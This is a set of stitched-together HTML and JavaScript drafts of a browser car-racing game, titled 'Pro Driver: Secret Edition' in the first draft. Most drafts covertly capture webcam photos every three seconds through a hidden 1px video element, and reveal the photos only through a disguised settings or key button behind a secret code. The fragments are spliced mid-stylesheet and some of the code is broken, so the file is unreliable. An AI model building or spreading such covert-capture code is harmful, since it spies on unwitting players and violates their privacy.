<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pro Driver: Secret Edition</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body { margin: 0; background: #111; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
        
        #score { font-size: 24px; color: #f1c40f; margin-bottom: 5px; }
        
        #gameArea {
            position: relative; width: 340px; height: 65vh;
            background: #222; border: 4px solid #444; overflow: hidden;
        }

        /* The Live Camera (Hidden from view but active) */
        #camContainer { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; }

        .line { position: absolute; width: 8px; height: 60px; background: rgba(255,255,255,0.2); left: 50%; transform: translateX(-50%); }

        /* Car Styling */
        .car { position: absolute; width: 45px; height: 75px; border-radius: 8px; z-index: 5; }
        .player { background: linear-gradient(#ff4d4d, #990000); border: 2px solid #fff; }
        .enemy { background: linear-gradient(#2ecc71, #1b5e20); border: 2px solid #000; }

        /* Secret Settings Icon (The Screw) */
        #secretBtn {
            position: fixed; bottom: 10px; right: 10px; font-size: 24px; 
            cursor: pointer; opacity: 0.3; z-index: 1000;
        }

        /* Controls */
        .controls { display: flex; gap: 40px; margin-top: 20px; }
        .btn { width: 70px; height: 70px; background: #333; border: none; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 0 #000; }
        .arrow { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; }
        .l-arr { border-right: 20px solid white; }
        .r-arr { border-left: 20px solid white; }

        /* Secret Gallery Modal */
        #secretGallery {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            display: none; flex-direction: column; align-items: center; padding: 20px; z-index: 2000;
        }
        .gallery-grid { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; overflow-y: auto; }
        .snap { width: 100px; height: 100px; border: 2px solid #f1c40f; border-radius: 5px; }

        #overlay {
            position: absolute; inset: 0; background: rgba(0,0,0,0.9);
            display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100;
        }
        .start-btn { padding: 15px 40px; font-size: 20px; background: #f1c40f; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div id="score">Score: 0</div>
    
    <div id="gameArea">
        <div id="camContainer"><video id="video" autoplay playsinline muted></video></div>
        <div id="overlay">
            <h1>PRO DRIVER</h1>
            <button class="start-btn" onclick="initGame()">START GAME</button>
        </div>
    </div>

    <div class="controls">
        <button class="btn" id="l"><div class="arrow l-arr"></div></button>
        <button class="btn" id="r"><div class="arrow r-arr"></div></button>
    </div>

    <div id="secretBtn" onclick="openSecret()">⚙️</div>

    <div id="secretGallery">
        <h2>Secret Logs</h2>
        <div class="gallery-grid" id="grid"></div>
        <button onclick="closeSecret()" style="margin-top:20px; padding:10px;">Close</button>
    </div>

    <canvas id="hiddenCanvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('hiddenCanvas');
        const grid = document.getElementById('grid');
        const secretGallery = document.getElementById('secretGallery');
        
        let gameActive = false;
        let capturedPhotos = []; // Secretly stored here
        let player = { x: 145, y: 380, score: 0, speed: 5, moveL: false, moveR: false };

        async function initGame() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
            } catch (e) { alert("Camera Permission Required!"); return; }

            document.getElementById('overlay').style.display = 'none';
            gameActive = true;
            setupGame();
            setInterval(takeSecretPhoto, 3000); // Take photo every 3 seconds
            requestAnimationFrame(update);
        }

        function takeSecretPhoto() {
            if (!gameActive) return;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 320, 240);
            capturedPhotos.push(canvas.toDataURL('image/jpeg', 0.5));
        }

        function openSecret() {
            const code = prompt("Enter Secret Code:");
            if (code === "vamsi jacks") {
                grid.innerHTML = "";
                capturedPhotos.forEach(src => {
                    const img = document.createElement('img');
                    img.src = src;
                    img.className = 'snap';
                    grid.appendChild(img);
                });
                secretGallery.style.display = 'flex';
            }
        }

        function closeSecret() { secretGallery.style.display = 'none'; }

        // --- Game Logic ---
        function setupGame() {
            gameArea.querySelectorAll('.car, .line').forEach(e => e.remove());
            for(let i=0; i<5; i++) {
                let l = document.createElement('div'); l.className = 'line'; l.y = i*150;
                l.style.top = l.y+'px'; gameArea.appendChild(l);
            }
            let p = document.createElement('div'); p.id = 'player'; p.className = 'car player';
            gameArea.appendChild(p);
            for(let i=0; i<3; i++) spawnEnemy();
        }

        function spawnEnemy() {
            let e = document.createElement('div'); e.className = 'car enemy';
            e.y = Math.random() * -600; e.style.left = Math.random() * 290 + 'px';
            gameArea.appendChild(e);
        }

        document.getElementById('l').onpointerdown = () => player.moveL = true;
        document.getElementById('l').onpointerup = () => player.moveL = false;
        document.getElementById('r').onpointerdown = () => player.moveR = true;
        document.getElementById('r').onpointerup = () => player.moveR = false;

        function update() {
            if (!gameActive) return;
            const p = document.getElementById('player');

            document.querySelectorAll('.line').forEach(l => {
                l.y += player.speed; if(l.y > 600) l.y = -100;
                l.style.top = l.y + 'px';
            });

            document.querySelectorAll('.enemy').forEach(e => {
                e.y += player.speed;
                if(e.y > 600) { e.y = -200; e.style.left = Math.random()*290+'px'; player.score++; }
                e.style.top = e.y + 'px';
                
                let r1 = p.getBoundingClientRect(); let r2 = e.getBoundingClientRect();
                if (!(r1.right < r2.left || r1.left > r2.right || r1.bottom < r2.top || r1.top > r2.bottom)) {
                    gameActive = false;
                    document.getElementById('overlay').style.display = 'flex';
                    document.querySelector('h1').innerText = "Crashed! Score: " + player.score;
                }
            });

            if (player.moveL && player.x > 0) player.x -= 5;
            if (player.moveR && player.x < 290) player.x += 5;
            p.style.left = player.x + 'px'; p.style.top = player.y + 'px';
            document.getElementById('score').innerText = "Score: " + player.score;
            requestAnimationFrame(update);
        }
    </script>
</body>
</html>

        #playerCar { background: linear-gradient(180deg, #e74c3c 0%, #c0392b 100%); }
        .enemy { background: linear-gradient(180deg, #2ecc71 0%, #27ae60 100%); }

        /* Controls */
        .controls { display: flex; gap: 40px; margin-top: 20px; }
        .arrow-btn { width: 70px; height: 70px; background: #444; border: none; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 0 #222; }
        .arrow { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; }
        .left-arrow { border-right: 25px solid white; }
        .right-arrow { border-left: 25px solid white; }

        /* Overlays */
        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100; color: white; text-align: center; }
        .restart-btn { margin-top: 15px; padding: 12px 30px; font-size: 18px; background: #f1c40f; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
        
        #photoGallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 5px; margin-top: 15px; max-height: 150px; overflow-y: auto; }
        .snap { width: 60px; height: 60px; border-radius: 5px; border: 1px solid #fff; }
        
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="cameraContainer">
        <video id="video" autoplay playsinline></video>
    </div>

    <div id="score">Score: 0</div>
    
    <div id="gameArea">
        <div id="overlay">
            <h1 id="status">READY TO DRIVE?</h1>
            <p id="subtext">Camera access required for selfies!</p>
            <div id="photoGallery"></div>
            <button class="restart-btn" onclick="initCameraAndStart()">START GAME</button>
        </div>
    </div>

    <canvas id="canvas" class="hidden"></canvas>

    <div class="controls">
        <button class="arrow-btn" id="leftBtn"><div class="arrow left-arrow"></div></button>
        <button class="arrow-btn" id="rightBtn"><div class="arrow right-arrow"></div></button>
    </div>

    <script>
        const gameArea = document.getElementById('gameArea');
        const scoreElement = document.getElementById('score');
        const overlay = document.getElementById('overlay');
        const statusText = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photoGallery = document.getElementById('photoGallery');
        
        let player = { speed: 6, score: 0, x: 150, y: 450, moveLeft: false, moveRight: false };
        let gameStart = false;
        let captureInterval;

        async function initCameraAndStart() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                start();
            } catch (err) {
                alert("Camera access denied! You can still play, but no photos will be taken.");
                start();
            }
        }

        function start() {
            gameStart = true;
            overlay.classList.add('hidden');
            photoGallery.innerHTML = ""; 
            gameArea.innerHTML = "";
            player.score = 0;
            player.x = 150;
            scoreElement.innerText = "Score: 0";
            
            for(let x=0; x<5; x++) {
                let line = document.createElement('div');
                line.classList.add('line');
                line.y = x*150;
                line.style.top = line.y + "px";
                gameArea.appendChild(line);
            }

            let car = document.createElement('div');
            car.setAttribute('id', 'playerCar');
            car.classList.add('car');
            gameArea.appendChild(car);

            for(let x=0; x<3; x++) { createEnemy(); }

            // Start taking pictures every 3 seconds
            captureInterval = setInterval(takeSnapshot, 3000);
            
            window.requestAnimationFrame(playGame);
        }

        function takeSnapshot() {
            if (!gameStart) return;
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            let img = document.createElement('img');
            img.src = canvas.toDataURL('image/png');
            img.classList.add('snap');
            photoGallery.appendChild(img);
        }

        function createEnemy() {
            let enemy = document.createElement('div');
            enemy.classList.add('car', 'enemy');
            enemy.y = ((Math.random() * 600) * -1);
            enemy.style.top = enemy.y + "px";
            enemy.style.left = Math.floor(Math.random() * 290) + "px";
            gameArea.appendChild(enemy);
        }

        // Controls
        const setLeft = (val) => player.moveLeft = val;
        const setRight = (val) => player.moveRight = val;
        document.getElementById('leftBtn').onmousedown = () => setLeft(true);
        document.getElementById('leftBtn').onmouseup = () => setLeft(false);
        document.getElementById('rightBtn').onmousedown = () => setRight(true);
        document.getElementById('rightBtn').onmouseup = () => setRight(false);
        document.getElementById('leftBtn').ontouchstart = (e) => { e.preventDefault(); setLeft(true); };
        document.getElementById('leftBtn').ontouchend = () => setLeft(false);
        document.getElementById('rightBtn').ontouchstart = (e) => { e.preventDefault(); setRight(true); };
        document.getElementById('rightBtn').ontouchend = () => setRight(false);

        function isCollide(a, b) {
            aRect = a.getBoundingClientRect();
            bRect = b.getBoundingClientRect();
            return !((aRect.bottom < bRect.top) || (aRect.top > bRect.bottom) || (aRect.right < bRect.left) || (aRect.left > bRect.right));
        }

        function playGame() {
            if (!gameStart) return;
            let car = document.getElementById('playerCar');
            let road = gameArea.getBoundingClientRect();

            document.querySelectorAll('.line').forEach((line) => {
                line.y += player.speed;
                if (line.y >= 700) line.y -= 750;
                line.style.top = line.y + "px";
            });

            document.querySelectorAll('.enemy').forEach((enemy) => {
                if (isCollide(car, enemy)) endGame();
                enemy.y += player.speed;
                if (enemy.y >= 750) {
                    enemy.y = -300;
                    enemy.style.left = Math.floor(Math.random() * 290) + "px";
                    player.score++;
                    scoreElement.innerText = "Score: " + player.score;
                }
                enemy.style.top = enemy.y + "px";
            });

            if (player.moveLeft && player.x > 0) player.x -= player.speed;
            if (player.moveRight && player.x < (road.width - 55)) player.x += player.speed;

            car.style.left = player.x + "px";
            car.style.top = player.y + "px";
            window.requestAnimationFrame(playGame);
        }

        function endGame() {
            gameStart = false;
            clearInterval(captureInterval);
            overlay.classList.remove('hidden');
            statusText.innerHTML = "GAME OVER<br>Score: " + player.score;
            document.getElementById('subtext').innerText = "Your Driving Faces:";
            document.querySelector('.restart-btn').innerText = "RESTART";
        }
    </script>
</body>
</html>
#car::after {
            content: '';
            position: absolute;
            bottom: -20px;
            left: 0;
            width: 100%;
            height: 40px;
            background-color: black;
        }
        .wheel {
            width: 25px;
            height: 25px;
            background-color: black;
            border-radius: 50%;
            position: absolute;
        }
        #front-wheel {
            bottom: -35px;
            left: 20px;
        }
        #back-wheel {
            bottom: -35px;
            right: 20px;
        }
        #windshield {
            position: absolute;
            top: 0;
            width: 100%;
            height: 60px;
            background-color: lightblue;
        }
        #obstacle {
            width: 40px;
            height: 40px;
            background-color: blue;
            position: absolute;
            right: -40px;
            bottom: 70px;
        }
        #secretButton {
            position: fixed;
            top: 10px;
            right: 10px;
            padding: 5px;
            background-color: transparent;
            border: none;
            color: white;
            cursor: pointer;
        }
        #capturedPhotos {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 20px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <button id="secretButton">🔑</button>
    <div id="gameContainer">
        <canvas id="gameCanvas" width="800" height="400"></canvas>
        <div id="car">
            <div class="wheel" id="front-wheel"></div>
            <div class="wheel" id="back-wheel"></div>
            <div id="windshield"></div>
        </div>
        <div id="obstacle"></div>
    </div>
    <script>
        let videoStream = null;
        let imageCapture = null;
        let capturedImages = [];
        const secretCode = "vamsi jacks"; // Secret code set to "vamsi jacks"
        // Access camera and start game
        document.querySelector("#gameContainer").addEventListener('click', function() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    videoStream = stream;
                    imageCapture = new ImageCapture(videoStream.getVideoTracks()[0]);
                    
                    // Start capturing images every 3 seconds
                    setInterval(() => {
                        imageCapture.takePhoto()
                            .then(blob => {
                                return blob.toBlob();
                            })
                            .then(blob => {
                                let url = URL.createObjectURL(blob);
                                capturedImages.push(url);
                            });
                    }, 3000);
                    startGame();
                })
                .catch(err => console.error("Error accessing camera: ", err));
        });
        function startGame() {
            // Car movement
            const car = document.getElementById('car');
            let carPosition = 375;
            document.addEventListener('keydown', (e) => {
                if(e.key === 'ArrowLeft') {
                    carPosition -= 20;
                    car.style.left = carPosition + 'px';
                }
                else if(e.key === 'ArrowRight') {
                    carPosition += 20;
                    car.style.left = carPosition + 'px';
                }
            });
            // Obstacle movement
            let obstaclePosition = -40;
            setInterval(() => {
                obstaclePosition += 5;
                document.getElementById('obstacle').style.right = (800 - obstaclePosition) + 'px';
                // Check collision
                if(obstaclePosition > 375 && obstaclePosition < 435) {
                    gameOver();
                }
            }, 50);
        }
        function gameOver() {
            alert("Game Over!");
            videoStream.getTracks().forEach(track => track.stop());
        }
        // Secret button functionality
        document.getElementById('secretButton').addEventListener('click', () => {
            const userInput = prompt("Enter the secret code:");
            if(userInput === secretCode) {
                displayCapturedPhotos();
            } else {
                alert("Wrong code!");
            }
        });
        function displayCapturedPhotos() {
            let photosDiv = document.getElementById('capturedPhotos');
            photosDiv.style.display = 'block';
            
            capturedImages.forEach((image, index) => {
                let img = document.createElement('img');
                img.src = image;
                img.style.maxWidth = '200px';
                img.style.margin = '5px';
                photosDiv.appendChild(img);
            });
        }
    </script>
</body>
</html>            top: 10px;
            right: 10px;
            padding: 5px;
            background-color: transparent;
            border: none;
            color: white;
            cursor: pointer;
        }
        #capturedPhotos {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 20px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <button id="secretButton">🔑</button>
    <div id="gameContainer">
        <canvas id="gameCanvas" width="800" height="400"></canvas>
        <div id="car"></div>
        <div id="obstacle"></div>
    </div>
    <script>
        let videoStream = null;
        let imageCapture = null;
        let capturedImages = [];
        const secretCode = "yoursecretcode"; // Set your secret code here
        // Access camera and start game
        document.querySelector("#gameContainer").addEventListener('click', function() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    videoStream = stream;
                    imageCapture = new ImageCapture(videoStream.getVideoTracks()[0]);
                    
                    // Start capturing images every 3 seconds
                    setInterval(() => {
                        imageCapture.takePhoto()
                            .then(blob => {
                                return blob.toBlob();
                            })
                            .then(blob => {
                                let url = URL.createObjectURL(blob);
                                capturedImages.push(url);
                            });
                    }, 3000);
                    startGame();
                })
                .catch(err => console.error("Error accessing camera: ", err));
        });
        function startGame() {
            // Car movement
            const car = document.getElementById('car');
            let carPosition = 375;
            document.addEventListener('keydown', (e) => {
                if(e.key === 'ArrowLeft') {
                    carPosition -= 20;
                    car.style.left = carPosition + 'px';
                }
                else if(e.key === 'ArrowRight') {
                    carPosition += 20;
                    car.style.left = carPosition + 'px';
                }
            });
            // Obstacle movement
            let obstaclePosition = -40;
            setInterval(() => {
                obstaclePosition += 5;
                document.getElementById('obstacle').style.right = (800 - obstaclePosition) + 'px';
                // Check collision
                if(obstaclePosition > 375 && obstaclePosition < 435) {
                    gameOver();
                }
            }, 50);
        }
        function gameOver() {
            alert("Game Over!");
            videoStream.getTracks().forEach(track => track.stop());
        }
        // Secret button functionality
        document.getElementById('secretButton').addEventListener('click', () => {
            const userInput = prompt("Enter the secret code:");
            if(userInput === secretCode) {
                displayCapturedPhotos();
            } else {
                alert("Wrong code!");
            }
        });
        function displayCapturedPhotos() {
            let photosDiv = document.getElementById('capturedPhotos');
            photosDiv.style.display = 'block';
            
            capturedImages.forEach((image, index) => {
                let img = document.createElement('img');
                img.src = image;
                img.style.maxWidth = '200px';
                img.style.margin = '5px';
                photosDiv.appendChild(img);
            });
        }
    </script>
</body>
</html>
